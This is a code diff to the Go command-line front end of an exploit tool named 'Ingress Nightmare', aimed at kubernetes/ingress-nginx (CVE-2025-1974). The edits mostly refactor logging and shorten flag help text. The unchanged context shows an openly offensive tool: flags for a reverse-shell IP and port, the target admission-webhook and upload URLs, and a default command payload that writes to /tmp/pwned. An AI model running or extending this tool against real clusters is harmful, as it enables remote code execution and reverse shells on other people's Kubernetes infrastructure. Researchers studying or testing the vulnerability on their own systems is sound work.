@@ -43,10 +43,10 @@ func init() {
 	_ = ExpCmd.MarkFlagRequired("mode")
 	ExpCmd.Flags().StringVarP(&Opts.IngressWebhookUrl, "ingress-webhook-url", "i",
 		"https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443",
-		"ingress webhook url, default should be \"https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443\"")
+		"ingress webhook url")
 	ExpCmd.Flags().StringVarP(&Opts.UploadUrl, "upload-url", "u",
 		"http://ingress-nginx-controller.ingress-nginx.svc.cluster.local:80",
-		"upload url, default should be \"http://ingress-nginx-controller.ingress-nginx.svc.cluster.local:80\"")
+		"upload url")
 
 	ExpCmd.Flags().IPVarP(&Opts.ReverseShellIp, "reverse-shell-ip", "r", defaultPodIp(), "reverse shell ip")
 	ExpCmd.Flags().Uint16VarP(&Opts.ReverseShellPort, "reverse-shell-port", "p", 0, "reverse shell port")
@@ -61,6 +61,17 @@ var ExpCmd = &cobra.Command{
 	Short: "Ingress Nightmare is a tool to exploit kubernetes/ingress-nginx",
 	Long: "Ingress Nightmare is a tool to exploit kubernetes/ingress-nginx, Thanks to Wiz amazing research." +
 		" CVE-2025-1974, https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities#how-did-we-discover-ingressnightmare-24",
+	PersistentPreRun: func(cmd *cobra.Command, args []string) {
+		logLevel := log.InfoLevel
+		if Opts.Verbose >= 2 {
+			logLevel = log.TraceLevel
+			nginx_ingress.Verbose = true
+		} else if Opts.Verbose == 1 {
+			logLevel = log.DebugLevel
+		}
+		log.SetLevel(logLevel)
+		log.SetOutput(os.Stdout)
+	},
 	Run: func(cmd *cobra.Command, args []string) {
 		var payload nginx_ingress.Payload
 		switch Opts.Mode {
@@ -82,18 +93,12 @@ var ExpCmd = &cobra.Command{
 		default:
 			payload = nginx_ingress.NewCommandPayload("id > /tmp/pwned")
 		}
+		log.Tracef("mode chosen: %s", Opts.Mode)
 		nginx_ingress.Exploit(Opts.IngressWebhookUrl, Opts.UploadUrl, payload)
 	},
 }
 
 func main() {
-	logLevel := log.InfoLevel
-	if Opts.Verbose >= 2 {
-		logLevel = log.TraceLevel
-	} else if Opts.Verbose == 1 {
-		logLevel = log.DebugLevel
-	}
-	log.SetLevel(logLevel)
 
 	if err := ExpCmd.Execute(); err != nil {
 		fmt.Println(err)
